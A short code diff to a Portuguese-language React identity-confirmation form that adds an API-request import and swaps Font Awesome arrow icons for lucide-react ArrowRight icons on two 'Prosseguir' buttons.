@@ -13,6 +13,7 @@ import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import { useQueryClient } from "@tanstack/react-query";
 import { ArrowRight } from "lucide-react";
+import { apiRequest } from "@/lib/queryClient";
 
 enum EtapaVerificacao {
   NOME = 0,
@@ -281,8 +282,8 @@ export default function ConfirmarIdentidade() {
                               className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                               disabled={isLoading || !nomeForm.watch("nome")}
                             >
-                              <i className="fas fa-arrow-right mr-2"></i>
                               <span>Prosseguir</span>
+                              <ArrowRight className="ml-2 h-5 w-5" />
                             </Button>
                           </div>
                         </form>
@@ -330,8 +331,8 @@ export default function ConfirmarIdentidade() {
                               className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                               disabled={isLoading || !anoForm.watch("ano")}
                             >
-                              <i className="fas fa-arrow-right mr-2"></i>
                               <span>Prosseguir</span>
+                              <ArrowRight className="ml-2 h-5 w-5" />
                             </Button>
                           </div>
                         </form>
